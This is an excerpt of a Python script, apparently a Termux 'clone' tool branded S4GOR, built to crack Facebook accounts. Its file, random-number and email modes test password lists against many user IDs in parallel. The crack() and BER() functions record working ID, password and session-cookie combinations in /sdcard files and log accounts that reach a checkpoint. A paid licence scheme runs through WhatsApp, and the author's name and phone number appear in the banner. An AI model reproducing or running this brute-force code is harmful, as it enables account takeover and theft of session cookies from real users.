...
os.system("XDg-open https://cutt.ly/W4wwv5F")
...
try:
	...
	open('.prox.XDt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[S4GOR-XD')
prox=open('.prox.XDt','r').read().splitlines()
...
\033[1;91m--------------------------------------------
\033[1;91m[+] CREATOR   > MD SAGOR HOSSEN
\033[1;91m[+] FACEBOOK  > MD SAGOR HOSSEN
\033[1;91m[+] GITHUB    > TOXIC-S4GOR
\033[1;91m[+] VERSION   > FREE
\033[1;91m[+] WHATSAPP  > +8801831018711
\033[1;91m-------------------------------------------"""  )
...
def menu():
	os.system('clear')
	banner()
	_S4GOR_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_S4GOR_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_S4GOR_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_S4GOR_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_S4GOR_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____S4GOR_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____S4GOR_____ in ['1']:
		C1()
	if _____S4GOR_____ in ['2']:
		Y2()
	if _____S4GOR_____ in ['3']:
		BER()
	if _____S4GOR_____ in ['4']:
		os.system("XDg-open https://cutt.ly/W4wwv5F")
	if _____S4GOR_____ in ['0']:
		exit()
...
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(S4GOR_NAME))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [S4GOR] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mS4GOR-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				print(f'\r\x1b[1;92m [\033[1;92mS4GOR-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				cek_apk(session,coki)
				open('/sdcard/S4GOR-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as S4GOR:
        clear()
        tl = str(len(user))      
...
def BER():
    ...
    print(' [\033[1;92m\033[1;34m\033[1;92m] Ids saved in ok.XDt,cp.XDt')
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mS4GOR-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/S4GOR-RANDOM.OK.XDt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[S4GOR-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def mex():
    ...
    try:
        ...
        kok = open('/sdcard/.a.XDt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ('')
        input('   \x1b[0;34mENTER TO BUY TOOLS ')
        os.system('am start https://wa.me/+8801831018711?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20S4GOR%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://github.com/TOXIC-S4GOR/FILE-MAIL-R4NDOM/blob/main/S4GORapproval.XDt').text
    if key1 in r:
        ...
        print ('')
        input('\033[1;92mIf you want to buy press enter ')
        os.system('am start https://wa.me/+8801831018711?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20S4GOR%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
##################
